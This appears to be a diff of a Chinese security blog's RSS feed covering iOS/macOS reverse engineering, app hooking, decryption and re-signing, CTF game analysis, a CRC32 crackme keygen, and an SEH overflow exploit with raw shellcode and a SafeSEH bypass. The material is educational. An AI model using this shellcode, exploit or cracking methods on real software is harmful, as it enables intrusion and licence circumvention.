@@ -17,7 +17,7 @@
 Load Commands: 描述了怎样加载每个 Segment 的信息. 在 Mach-O 文件中可以有多个 Segment, 每个 Segment 可能包含一个或多个 Section.
 Data: Segment 的具体数据, 包含了代码和数据等.
 Mach-O 头部定义(macOS 10.15 sdk):
-/* * The 64-bit mach header appears at the very beginning of object files for * 64-bit architectures. */ struct mach_header_64 { uint32_t	magic;	/* mach magic number identifier */ cpu_type_t	cputype;	/* cpu specifier */ cpu_subtype_t	cpusubtype;	/* machine specifier */ uint32_t	filetype;	/* type of file */ uint32_t	ncmds;	/* number of load commands */ uint32_t	sizeofcmds;	/* the size of all the load commands */ uint32_t	flags;	/* flags */ uint32_t	reserved;	/* reserved */ }; /* Constant for the magic field of the mach_header_64 (64-bit architectures) */ #define MH_MAGIC_64 0xfeedfacf /* the 64-bit mach magic number */ #define MH_CIGAM_64 0xcffaedfe /* NXSwapInt(MH_MAGIC_64) */  cputype 和 cpusubtype 确定 cpu 类型、平台</description>
+/* * The 64-bit mach header appears at the very beginning of object files for * 64-bit architectures. */ struct mach_header_64 { uint32_t	magic;	/* mach magic number identifier */ cpu_type_t	cputype;	/* cpu specifier */ cpu_subtype_t	cpusubtype;	/* machine specifier */ uint32_t	filetype;	/* type of file */ uint32_t	ncmds;	/* number of load commands */ uint32_t	sizeofcmds;	/* the size of all the load commands */ uint32_t	flags;	/* flags */ uint32_t	reserved;	/* reserved */ }; /* Constant for the magic field of the mach_header_64 (64-bit architectures) */ #define MH_MAGIC_64 0xfeedfacf /* the 64-bit mach magic number */ #define MH_CIGAM_64 0xcffaedfe /* NXSwapInt(MH_MAGIC_64) */ cputype 和 cpusubtype 确定 cpu 类型、平台</description>
     </item>
     
     <item>
@@ -27,18 +27,18 @@ Mach-O 头部定义(macOS 10.15 sdk):
       
       <guid>https://aiQG.github.io/ios-hook/</guid>
       <description>前提:
-  MonkeyAPP(及其依赖)
-  class-dump
-  Reveal
-  砸壳
-  对于非越狱设备, 可以在TargetApp文件夹中放入ipa后编译运行一下(安装到设备上), 然后运行Reveal分析APP的UI结构, 记录下需要hook的控件类名, 在用class-dump导出的头文件中找到这个类的相关方法进行hook.
+MonkeyAPP(及其依赖)
+class-dump
+Reveal
+砸壳
+对于非越狱设备, 可以在TargetApp文件夹中放入ipa后编译运行一下(安装到设备上), 然后运行Reveal分析APP的UI结构, 记录下需要hook的控件类名, 在用class-dump导出的头文件中找到这个类的相关方法进行hook.
 可以在hook代码中利用%log(Logos语法)打印出被hook函数的所有参数, 从而找到有用信息(例如对于UIButton类型的控件, 可以找到点击它调用的方法). // 对于Logos语法的代码写在 HookAppDylib.xm
 hook WeChat.app注册和登录页面:
 Reveal找到登录和注册两个按钮是FixTitleColorButton类
 在class-dump导出的头中找到这个类, 发现是继承UIButton的, 所以hook FixTitleColorButton的 -(void)addTarget:(id)target action:(SEL)action forControlEvents:(UIControlEvents)controlEvents 方法. (这个函数存在于父类UIButton, 可以从Apple官方文档找到其他有用的函数)
 利用%log找到初始化的信息(查看参数controlEvents)
-%hook FixTitleColorButton - (void)addTarget:(id)target action:(SEL)action forControlEvents:(UIControlEvents)controlEvents{ %log; %orig(target, action, controlEvents); } %end  得到两段输出
-WeChat[1136:259626] [1;36m[HookAppDylib] [m [0;36m/Users/zc/Desktop/HookApp/HookAppDylib/Logos/HookAppDylib.xm:9 [m [0;30;46mDEBUG: [m -[&amp;lt;FixTitleColorButton: 0x14fd411e0&amp;gt; addTarget:&amp;lt;WCAccountLoginControlLogic: 0x2805a9c70&amp;gt; action:onFirstViewLogin forControlEvents:0x40] WeChat[1136:259626] [1;36m[HookAppDylib] [m [0;36m/Users/zc/Desktop/HookApp/HookAppDylib/Logos/HookAppDylib.</description>
+%hook FixTitleColorButton - (void)addTarget:(id)target action:(SEL)action forControlEvents:(UIControlEvents)controlEvents{ %log; %orig(target, action, controlEvents); } %end 得到两段输出
+WeChat[1136:259626] [1;36m[HookAppDylib] [m [0;36m/Users/zc/Desktop/HookApp/HookAppDylib/Logos/HookAppDylib.xm:9 [m [0;30;46mDEBUG: [m -[&amp;lt;FixTitleColorButton: 0x14fd411e0&amp;gt; addTarget:&amp;lt;WCAccountLoginControlLogic: 0x2805a9c70&amp;gt; action:onFirstViewLogin forControlEvents:0x40] WeChat[1136:259626] [1;36m[HookAppDylib] [m [0;36m/Users/zc/Desktop/HookApp/HookAppDylib/Logos/HookAppDylib.xm:9 [m [0;30;46mDEBUG: [m -[&amp;lt;FixTitleColorButton: 0x14fd67980&amp;gt; addTarget:&amp;lt;WCAccountLoginControlLogic: 0x2805a9c70&amp;gt; action:onFirstViewRegister forControlEvents:0x40] target分别是 onFirstViewLogin 和 onFirstViewRegister , 类是 WCAccountLoginControlLogic .</description>
     </item>
     
     <item>
@@ -53,7 +53,7 @@ WeChat[1136:259626] [1;36m[HookAppDylib] [m [0;36m/Users/zc/Desktop/HookApp/Hook
 看到是unity做的, 用Il2CppDumper 从Unity il2cpp文件还原DLl, 生成的ida脚本可以恢复很多函数名, dump.cs保存用到的类
 然后拿到binary, 用ida加载, 跑Il2CppDumper生成的脚本, 恢复一下函数名(这两步可能需要很长时间, 这期间可以找找dump.cs里可能有用的方法)
 找到一个player类, 里面有个 KillCharacter 和 KillCharacterNow , 猜测和玩家死亡有关
-lldb远程调试, image list -b pacman256  找到基地址, 通过dump.cs结合ida找到函数位置下断点调试//arm64的寄存器比较特殊, 主要关注PC(下一条执行的指令)和LR(子程序结束后执行的指令(相当于返回地址))
+lldb远程调试, image list -b pacman256 找到基地址, 通过dump.cs结合ida找到函数位置下断点调试//arm64的寄存器比较特殊, 主要关注PC(下一条执行的指令)和LR(子程序结束后执行的指令(相当于返回地址))
 回溯找到偏移为0x7CEA4的OnTriggerEnter函数(BadGuy类)//一看就知道是碰到👻触发的判断////当然不能直接把这个函数给干掉, 因为游戏中还有各种杀死👻的机制
 这个函数偏移0x6e8处有个 B.NE 的关键跳转, 每当玩家碰到ghost就会触发判断, 若跳转则玩家不死亡, 不跳转则玩家死亡
 改成 0010007D58C 06 00 00 14 B loc_10007D5A4 无条件跳转
@@ -71,7 +71,7 @@ lldb远程调试, image list -b pacman256  找到基地址, 通过dump.cs结合i
       <guid>https://aiQG.github.io/ios%E9%80%86%E5%90%91-%E9%87%8D%E7%AD%BE%E5%90%8D/</guid>
       <description>iOS逆向最后一步: “重签名”
 第一步, 将Payload文件夹压缩成.zip, 然后将.zip后缀改成.ipa
-找到一个 .mobileprovision 文件(最好是先创建一个iOS项目, 在真机上跑一下, 然后到 ~/Library/MobileDevice/Provisioning\ Profiles/  复制)(这个证书到期很快, 到时候又要重签名)//, 正在探索优秀的重签名方案
+找到一个 .mobileprovision 文件(最好是先创建一个iOS项目, 在真机上跑一下, 然后到 ~/Library/MobileDevice/Provisioning\ Profiles/ 复制)(这个证书到期很快, 到时候又要重签名)//, 正在探索优秀的重签名方案
 运行 iReSign(或ios-app-signer) 项目, 分别填上要签名的.ipa, .mobileprovision 文件路径, (.plist不用填), 项目的Bundle Identifier(可以在项目的配置文件里找到), 证书(和项目的Bundle Identifier 对应, 同样可以在项目的配置文件里找到)
 // ⚠️: 选择.plist路径的位置应该留空(程序会自动根据.mobileprovision文件导出.plist). 除非有特殊需要
 // ⚠️: 对于没有进行砸壳的插件和app, 签名/安装时可能出错
@@ -87,14 +87,16 @@ lldb远程调试, image list -b pacman256  找到基地址, 通过dump.cs结合i
       <guid>https://aiQG.github.io/ios%E9%80%86%E5%90%91-%E7%A0%B8%E5%A3%B3/</guid>
       <description>iOS逆向第一步: &amp;ldquo;砸壳&amp;rdquo;
 由于App Store上下载下来的应用是套了层壳的(目测是压缩壳), 所以要dump一下
-工具 macOS端   iproxy 用于把端口代理到ssh上(iproxy是usbmuxd自带的一个小工具) brew install usbmuxd
-  frida 和 frida-ios-dump dump的主角
-  iOS端  越狱 // axi0mX 大神挖到iPhone BootROM级别的漏洞让iPhone5s到iPhoneX, iOS 12.3 及以上系统能够越狱 https://checkra.in/ 🐮🍺  // ⚠️: 用checkra1n越狱需要使用USB连接, 用lightning to type-C数据线会无法进入DFU模式
- Cydia上安装Frida 添加源 https://build.frida.re/  安装frida注意安装到python2还是python3, 对应frida-ios-dump的不同分支(3.x的分支是python3的)//python2官方都不支持了, 还是安装python3吧
+工具 macOS端 iproxy 用于把端口代理到ssh上(iproxy是usbmuxd自带的一个小工具) brew install usbmuxd
+frida 和 frida-ios-dump dump的主角
+iOS端 越狱 // axi0mX 大神挖到iPhone BootROM级别的漏洞让iPhone5s到iPhoneX, iOS 12.3 及以上系统能够越狱 https://checkra.in/ 🐮🍺 // ⚠️: 用checkra1n越狱需要使用USB连接, 用lightning to type-C数据线会无法进入DFU模式
+Cydia上安装Frida 添加源 https://build.frida.re/ 安装frida注意安装到python2还是python3, 对应frida-ios-dump的不同分支(3.x的分支是python3的)//python2官方都不支持了, 还是安装python3吧
 克隆frida-ios-dump
 git clone -b 3.x https://github.com/AloneMonkey/frida-ios-dump.git
 //可以到dump.py里修改连接的参数 一般默认:
-User = &#39;root&#39; Password = &#39;alpine&#39; Host = &#39;localhost&#39; Port = 2222  进入 frida-ios-dump 目录更新一下依赖</description>
+User = &#39;root&#39; Password = &#39;alpine&#39; Host = &#39;localhost&#39; Port = 2222 进入 frida-ios-dump 目录更新一下依赖
+sudo pip3 install -r requirements.txt --upgrade
+//遇到一个prompt-toolkit版本不符合的信息, 卸载重装一下就好了</description>
     </item>
     
     <item>
@@ -104,7 +106,7 @@ User = &#39;root&#39; Password = &#39;alpine&#39; Host = &#39;localhost&#39; Por
       
       <guid>https://aiQG.github.io/%E4%BB%8Eprint%E5%BC%80%E5%A7%8B/</guid>
       <description>看了几天的metadata感觉没什么收获, 发现对swift的一些特性还不是很清楚, 决定从最常用的print开始分析
-func callFunc() { print(&amp;quot;HelloWorld!&amp;quot;) }  callFunc() @ hackSwift: 0x100000a50: push rbp 0x100000a51: mov rbp, rsp 0x100000a54: sub rsp, 0x30 0x100000a58: mov rax, qword ptr [rip + 0x5b1] ; (void *)0x00007fff90c55908: type metadata for Any 0x100000a5f: add rax, 0x8	; Any的Super point 0x100000a63: mov edi, 0x1 ; print第一个参数的个数 0x100000a68: mov rsi, rax ; 初始化(Any)数组 0x100000a6b: call 0x100000e60 ; symbol stub for: Swift._allocateUninitializedArray&amp;lt;A&amp;gt;(Builtin.Word) -&amp;gt; (Swift.Array&amp;lt;A&amp;gt;, Builtin.RawPointer) 0x100000a70: lea rdi, [rip + 0x4d5] ; &amp;quot;HelloWorld!</description>
+func callFunc() { print(&amp;quot;HelloWorld!&amp;quot;) } callFunc() @ hackSwift: 0x100000a50: push rbp 0x100000a51: mov rbp, rsp 0x100000a54: sub rsp, 0x30 0x100000a58: mov rax, qword ptr [rip + 0x5b1] ; (void *)0x00007fff90c55908: type metadata for Any 0x100000a5f: add rax, 0x8	; Any的Super point 0x100000a63: mov edi, 0x1 ; print第一个参数的个数 0x100000a68: mov rsi, rax ; 初始化(Any)数组 0x100000a6b: call 0x100000e60 ; symbol stub for: Swift._allocateUninitializedArray&amp;lt;A&amp;gt;(Builtin.Word) -&amp;gt; (Swift.Array&amp;lt;A&amp;gt;, Builtin.RawPointer) 0x100000a70: lea rdi, [rip + 0x4d5] ; &amp;quot;HelloWorld!</description>
     </item>
     
     <item>
@@ -121,13 +123,12 @@ codesign -d --entitlements :- [yourAPP]
 将当前权限配置导出
 codesign -d --entitlements :- [yourAPP] &amp;gt;&amp;gt; temp.plist
 在temp.plist中添加
-&amp;lt;key&amp;gt;com.apple.security.get-task-allow&amp;lt;/key&amp;gt; &amp;lt;true/&amp;gt;  保存
+&amp;lt;key&amp;gt;com.apple.security.get-task-allow&amp;lt;/key&amp;gt; &amp;lt;true/&amp;gt; 保存
 找到系统上安装的所有签名身份的列表(需要开发者账号)
 security find-identity -v -p codesigning
 重新签名
-codesign --sign &amp;quot;Apple Development: ***@***.com (***)&amp;quot; -f --timestamp --options=runtime --entitlements temp.plist [yourAPP] 
-签名完成，可以调试
- 静态分析的过程在这里
+codesign --sign &amp;quot;Apple Development: ***@***.com (***)&amp;quot; -f --timestamp --options=runtime --entitlements temp.plist [yourAPP] 签名完成，可以调试
+静态分析的过程在这里
 这里用动态分析的方法验证一下静态分析
 首先按照上面给出的步骤加上权限
 然后在 sub_1000034C0 开始处下断点, 可以发现每次子弹与敌人接触或者玩家与敌人接触就会触发断点，确定这是一个判断碰撞的函数
@@ -145,11 +146,12 @@ codesign --sign &amp;quot;Apple Development: ***@***.com (***)&amp;quot; -f --ti
       <description>//这是一个macOS下用swift5 + SpriteKit框架写出来的touchbar上的游戏 考虑到有mac的师傅并不多，所以这里提供一个静态分析的解法&amp;hellip;
 //动态分析链接
 得到的是一个后缀为.app的文件夹(macOS下的应用)。Contents\MacOS下有一个touchbarGame这个就是游戏本体
- 关于.app里各个文件： _CodeSignature文件夹 是各个文件的数字签名防止被篡改 Resources文件夹 是各种资源文件 MacOS文件夹 是此App的真正可执行文件 Info.plist文件 是App的基本信息(比如最低系统版本要求, 版本号, Copyright等等标识) PkgInfo文件 是一个可选的8个字节长度的文件, 可保存程序类型和创建者签名(当然这些可以写在 Info.plist 中), 这个文件通常包含四字节的程序类型信息(通常为 APPL)和四个字节的签名信息(比如 System Preferences.app 的 PkgInfo 就是 APPLsprf) Assets.car中保存着资源图片
- //关于资源文件Assets.car的分析链接 Assets.car文件可以提取出资源图片(似乎有在线提取的, 但是并不能提取出全部的东西) (关于提取资源, 似乎没有找到非macOS上的现成工具) 可以看到有&amp;quot;shot&amp;quot;,&amp;ldquo;rock&amp;quot;和&amp;quot;enemy&amp;quot;的图片, 猜测是&amp;quot;打飞机的游戏&amp;rdquo;(跑不起来只能猜了呗&amp;hellip;) //这个游戏打起来是这样的&amp;hellip;&amp;hellip;ida分析touchbarGame可以看到函数里有Objective-C的方法和swift的函数, 大多数的函数的名字ida都给分析出来了//所以猜测个别函数的作用还是比较简单的  OC调用函数的机制是&amp;quot;send message&amp;quot;(OC的Runtime), 相当于在运行时才确定函数调用, 所以ctrl+x查看函数的交叉引用几乎是找不到啥信息的了
- 因为无法运行(无法知道程序输入输出), 我们可以找找程序中的字符串, 提取关键信息
-  发现有个&amp;quot;/114514) R(estart)&amp;quot; //114514??? 我们交叉引用跟过去到sub_100002190, 发现这个函数里OC发了很多带&amp;quot;set&amp;quot;的消息, 可以推断这里是初始化整个游戏的位置 那这个字符串应该就是一个(提示重新开始的)Label
-  可以找到头的信息 看到使用了几个框架, google一下发现SpriteKit这个框架有&amp;quot;Physics Simulation&amp;quot;的class, 其中有一个SKPhysicsContact看Apple文档的描述可以发现这个东西和物体的接触(碰撞)有关(因为这是个游戏, 所以检测碰撞的功能是一个关键的位置) 继续往下看文档, 有两个变量bodyA和bodyB 由于OC执行函数的机制(发消息), 我们可以在字符串中搜到这两个变量的名字, 并且可以交叉引用找到给Runtime System 发消息的函数sub_1000034C0   //也可以尝试搜索一下包含&amp;quot;print&amp;quot;的函数, 找到_$ss5print_9separator10terminatoryypd_S2StF, 发现有两处调用了这个函数, 而且也都在sub_1000034C0里</description>
+关于.app里各个文件： _CodeSignature文件夹 是各个文件的数字签名防止被篡改 Resources文件夹 是各种资源文件 MacOS文件夹 是此App的真正可执行文件 Info.plist文件 是App的基本信息(比如最低系统版本要求, 版本号, Copyright等等标识) PkgInfo文件 是一个可选的8个字节长度的文件, 可保存程序类型和创建者签名(当然这些可以写在 Info.plist 中), 这个文件通常包含四字节的程序类型信息(通常为 APPL)和四个字节的签名信息(比如 System Preferences.app 的 PkgInfo 就是 APPLsprf) Assets.car中保存着资源图片
+//关于资源文件Assets.car的分析链接 Assets.car文件可以提取出资源图片(似乎有在线提取的, 但是并不能提取出全部的东西) (关于提取资源, 似乎没有找到非macOS上的现成工具) 可以看到有&amp;quot;shot&amp;quot;,&amp;ldquo;rock&amp;quot;和&amp;quot;enemy&amp;quot;的图片, 猜测是&amp;quot;打飞机的游戏&amp;rdquo;(跑不起来只能猜了呗&amp;hellip;) //这个游戏打起来是这样的&amp;hellip;&amp;hellip;
+ida分析touchbarGame可以看到函数里有Objective-C的方法和swift的函数, 大多数的函数的名字ida都给分析出来了//所以猜测个别函数的作用还是比较简单的 OC调用函数的机制是&amp;quot;send message&amp;quot;(OC的Runtime), 相当于在运行时才确定函数调用, 所以ctrl+x查看函数的交叉引用几乎是找不到啥信息的了
+因为无法运行(无法知道程序输入输出), 我们可以找找程序中的字符串, 提取关键信息
+发现有个&amp;quot;/114514) R(estart)&amp;quot; //114514??? 我们交叉引用跟过去到sub_100002190, 发现这个函数里OC发了很多带&amp;quot;set&amp;quot;的消息, 可以推断这里是初始化整个游戏的位置 那这个字符串应该就是一个(提示重新开始的)Label
+可以找到头的信息 看到使用了几个框架, google一下发现SpriteKit这个框架有&amp;quot;Physics Simulation&amp;quot;的class, 其中有一个SKPhysicsContact看Apple文档的描述可以发现这个东西和物体的接触(碰撞)有关(因为这是个游戏, 所以检测碰撞的功能是一个关键的位置) 继续往下看文档, 有两个变量bodyA和bodyB 由于OC执行函数的机制(发消息), 我们可以在字符串中搜到这两个变量的名字, 并且可以交叉引用找到给Runtime System 发消息的函数sub_1000034C0 //也可以尝试搜索一下包含&amp;quot;print&amp;quot;的函数, 找到_$ss5print_9separator10terminatoryypd_S2StF, 发现有两处调用了这个函数, 而且也都在sub_1000034C0里</description>
     </item>
     
     <item>
@@ -158,9 +160,9 @@ codesign --sign &amp;quot;Apple Development: ***@***.com (***)&amp;quot; -f --ti
       <pubDate>Wed, 02 Oct 2019 00:00:00 +0000</pubDate>
       
       <guid>https://aiQG.github.io/seh%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</guid>
-      <description>跟到main里发现main里的SHE节点已经初始化 重启程序找到初始化main的SHE节点的函数 进入test函数的SHE节点初始化 触发断点后可以看见eip跳到了test函数的SE处理函数(并且在跳过去的过程中又创建了一个节点) 进入vcruntim, 往下找到获取异常处理函数地址的位置 回到strcpy处, 计算buf变量到SEH节点(保存处理函数的地址处)的相对偏移(==0xd8) 覆盖成功  基本流程梳理清楚了 尝试覆盖函数地址 vs2019关闭SAFESEH 程序无法跳到栈上执行(检查了目标地址是否在栈内) 所以采用直接跳到全局变量shellcode(0x403018)处执行 shellcode:
-&amp;quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&amp;quot; &amp;quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&amp;quot; &amp;quot;\xfc\x68\x6a\x0a\x38\x1e\x68\x63\x89\xd1\x4f\x68\x32\x74\x91\x0c&amp;quot; &amp;quot;\x8b\xf4\x8d\x7e\xf4\x33\xdb\xb7\x04\x2b\xe3\x66\xbb\x33\x32\x53&amp;quot; &amp;quot;\x68\x75\x73\x65\x72\x54\x33\xd2\x64\x8b\x5a\x30\x8b\x4b\x0c\x8b&amp;quot; &amp;quot;\x49\x1c\x8b\x09\x8b\x69\x08\xad\x3d\x6a\x0a\x38\x1e\x75\x05\x95&amp;quot; &amp;quot;\xff\x57\xf8\x95\x60\x8b\x45\x3c\x8b\x4c\x05\x78\x03\xcd\x8b\x59&amp;quot; &amp;quot;\x20\x03\xdd\x33\xff\x47\x8b\x34\xbb\x03\xf5\x99\x0f\xbe\x06\x3a&amp;quot; &amp;quot;\xc4\x74\x08\xc1\xca\x07\x03\xd0\x46\xeb\xf1\x3b\x54\x24\x1c\x75&amp;quot; &amp;quot;\xe4\x8b\x59\x24\x03\xdd\x66\x8b\x3c\x7b\x8b\x59\x1c\x03\xdd\x03&amp;quot; &amp;quot;\x2c\xbb\x95\x5f\xab\x57\x61\x3d\x6a\x0a\x38\x1e\x75\xa9\x33\xdb&amp;quot; &amp;quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6c\x8b\xc4\x53\x50\x50&amp;quot; &amp;quot;\x53\xff\x57\xfc\x53\xff\x57\xf8\x90\x90\x90\x90\x90\x90\x90\x90&amp;quot; &amp;quot;\x90\x90\x90\x90\x90\x90\x90\x90\x18\x30\x40\x00&amp;quot;  坑:
- 之前用了DEBUG版本, 发现eip并不能跳到指定位置, 程序在开始处理异常后会卡死, 猜测是进行了检查 程序没有触发异常, 发现是shellcode把变量zero的值给覆盖成了0x90909090, 然后把shellcode对应位置改成\x00后发现strcpy会截断\x00后的内容, 所以在strcpy后重新给zero重新赋0值(环境不同, 编译出的结果不同)   开启safeSEH
+      <description>跟到main里发现main里的SHE节点已经初始化 重启程序找到初始化main的SHE节点的函数 进入test函数的SHE节点初始化 触发断点后可以看见eip跳到了test函数的SE处理函数(并且在跳过去的过程中又创建了一个节点) 进入vcruntim, 往下找到获取异常处理函数地址的位置 回到strcpy处, 计算buf变量到SEH节点(保存处理函数的地址处)的相对偏移(==0xd8) 覆盖成功 基本流程梳理清楚了 尝试覆盖函数地址 vs2019关闭SAFESEH 程序无法跳到栈上执行(检查了目标地址是否在栈内) 所以采用直接跳到全局变量shellcode(0x403018)处执行 shellcode:
+&amp;quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&amp;quot; &amp;quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&amp;quot; &amp;quot;\xfc\x68\x6a\x0a\x38\x1e\x68\x63\x89\xd1\x4f\x68\x32\x74\x91\x0c&amp;quot; &amp;quot;\x8b\xf4\x8d\x7e\xf4\x33\xdb\xb7\x04\x2b\xe3\x66\xbb\x33\x32\x53&amp;quot; &amp;quot;\x68\x75\x73\x65\x72\x54\x33\xd2\x64\x8b\x5a\x30\x8b\x4b\x0c\x8b&amp;quot; &amp;quot;\x49\x1c\x8b\x09\x8b\x69\x08\xad\x3d\x6a\x0a\x38\x1e\x75\x05\x95&amp;quot; &amp;quot;\xff\x57\xf8\x95\x60\x8b\x45\x3c\x8b\x4c\x05\x78\x03\xcd\x8b\x59&amp;quot; &amp;quot;\x20\x03\xdd\x33\xff\x47\x8b\x34\xbb\x03\xf5\x99\x0f\xbe\x06\x3a&amp;quot; &amp;quot;\xc4\x74\x08\xc1\xca\x07\x03\xd0\x46\xeb\xf1\x3b\x54\x24\x1c\x75&amp;quot; &amp;quot;\xe4\x8b\x59\x24\x03\xdd\x66\x8b\x3c\x7b\x8b\x59\x1c\x03\xdd\x03&amp;quot; &amp;quot;\x2c\xbb\x95\x5f\xab\x57\x61\x3d\x6a\x0a\x38\x1e\x75\xa9\x33\xdb&amp;quot; &amp;quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6c\x8b\xc4\x53\x50\x50&amp;quot; &amp;quot;\x53\xff\x57\xfc\x53\xff\x57\xf8\x90\x90\x90\x90\x90\x90\x90\x90&amp;quot; &amp;quot;\x90\x90\x90\x90\x90\x90\x90\x90\x18\x30\x40\x00&amp;quot; 坑:
+之前用了DEBUG版本, 发现eip并不能跳到指定位置, 程序在开始处理异常后会卡死, 猜测是进行了检查 程序没有触发异常, 发现是shellcode把变量zero的值给覆盖成了0x90909090, 然后把shellcode对应位置改成\x00后发现strcpy会截断\x00后的内容, 所以在strcpy后重新给zero重新赋0值(环境不同, 编译出的结果不同) 开启safeSEH
 绕过safeSEH的方法还是挺多的
 这里利用堆绕过
 #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;Windows.h&amp;gt; char shellCode[] = &amp;quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&amp;quot; &amp;quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&amp;quot; &amp;quot;\xfc\x68\x6a\x0a\x38\x1e\x68\x63\x89\xd1\x4f\x68\x32\x74\x91\x0c&amp;quot; &amp;quot;\x8b\xf4\x8d\x7e\xf4\x33\xdb\xb7\x04\x2b\xe3\x66\xbb\x33\x32\x53&amp;quot; &amp;quot;\x68\x75\x73\x65\x72\x54\x33\xd2\x64\x8b\x5a\x30\x8b\x4b\x0c\x8b&amp;quot; &amp;quot;\x49\x1c\x8b\x09\x8b\x69\x08\xad\x3d\x6a\x0a\x38\x1e\x75\x05\x95&amp;quot; &amp;quot;\xff\x57\xf8\x95\x60\x8b\x45\x3c\x8b\x4c\x05\x78\x03\xcd\x8b\x59&amp;quot; &amp;quot;\x20\x03\xdd\x33\xff\x47\x8b\x34\xbb\x03\xf5\x99\x0f\xbe\x06\x3a&amp;quot; &amp;quot;\xc4\x74\x08\xc1\xca\x07\x03\xd0\x46\xeb\xf1\x3b\x54\x24\x1c\x75&amp;quot; &amp;quot;\xe4\x8b\x59\x24\x03\xdd\x66\x8b\x3c\x7b\x8b\x59\x1c\x03\xdd\x03&amp;quot; &amp;quot;\x2c\xbb\x95\x5f\xab\x57\x61\x3d\x6a\x0a\x38\x1e\x75\xa9\x33\xdb&amp;quot; &amp;quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6c\x8b\xc4\x53\x50\x50&amp;quot; &amp;quot;\x53\xff\x57\xfc\x53\xff\x57\xf8\x90\x90\x90\x90\x90\x90\x90\x90&amp;quot; &amp;quot;\x90\x90\x90\x90\x90\x90\x90\x90\x18\x30\x40\x00&amp;quot;; char jumpCode[] = &amp;quot;aaaaaaaaaaaaa\xaa\xbb\xcc\xdd&amp;quot;; DWORD myExceptionHandler() { printf(&amp;quot;Got an exception!</description>
@@ -183,7 +185,7 @@ codesign --sign &amp;quot;Apple Development: ***@***.com (***)&amp;quot; -f --ti
       <guid>https://aiQG.github.io/crackme_crc32/</guid>
       <description>//前几天才在0CTF做了个CRC128不动点的题(太菜没做出来)。今天正好学习一下 //文末决定玩一玩CRC循环码的特性
 随便输入一点东西 发现只有输入的Name长度大于5才有错误提示框, 有提示框就好办了 ida找到几个MessageBox 交叉引用看看在哪被使用了, 找到有明显判断+跳转的函数 在函数开始的地方下断点, 调试 1.程序先获取Name的长度 判断不小于5继续 2.Name前面加上盐 3.计算加盐后Name的CRC32 4.获取Code长度 判断不小于0继续 5.将Code进行相关计算得到一个数字X 6.X与CRC32点值比对 相同则ok //CRC32作为“优秀的”hash循环码 逆是不会逆出来的 但是可以碰撞 算Code的关键算法: CRC32的算法不能逆运算, 但是可以看出Code的算法是将输入的Code变成一个十进制数
-import binascii name=&#39;&#39; name = raw_input(&#39;input your user name:\t&#39;)#py2 name = &#39;DiKeN&#39;+name crc32code = binascii.crc32(name) #为了保证CRC是正的 if crc32code&amp;lt;0: crc32code = ~binascii.crc32(name)^0xffffffff elif crc32code&amp;gt;0: crc32code = binascii.crc32(name) code=&#39;&#39; while crc32code!=0: code = str(crc32code % 10) + code crc32code = crc32code // 10 print &#39;your code:\t&#39;+code   crc循环校验码的特性导致同一个Code可能对应多个Name 由于程序正向不需要判断Code是否为0～9(合法字符) 所以为了方便这里限制Code只能为0～9的数字//这里有个非预期 由于没有判断Code是否为0～9(合法字符)所以可以构造出多个奇怪而正确的Code 32位的crc只能构造出0x10000000到0xffffffff的hash</description>
+import binascii name=&#39;&#39; name = raw_input(&#39;input your user name:\t&#39;)#py2 name = &#39;DiKeN&#39;+name crc32code = binascii.crc32(name) #为了保证CRC是正的 if crc32code&amp;lt;0: crc32code = ~binascii.crc32(name)^0xffffffff elif crc32code&amp;gt;0: crc32code = binascii.crc32(name) code=&#39;&#39; while crc32code!=0: code = str(crc32code % 10) + code crc32code = crc32code // 10 print &#39;your code:\t&#39;+code crc循环校验码的特性导致同一个Code可能对应多个Name 由于程序正向不需要判断Code是否为0～9(合法字符) 所以为了方便这里限制Code只能为0～9的数字//这里有个非预期 由于没有判断Code是否为0～9(合法字符)所以可以构造出多个奇怪而正确的Code 32位的crc只能构造出0x10000000到0xffffffff的hash</description>
     </item>
     
   </channel>
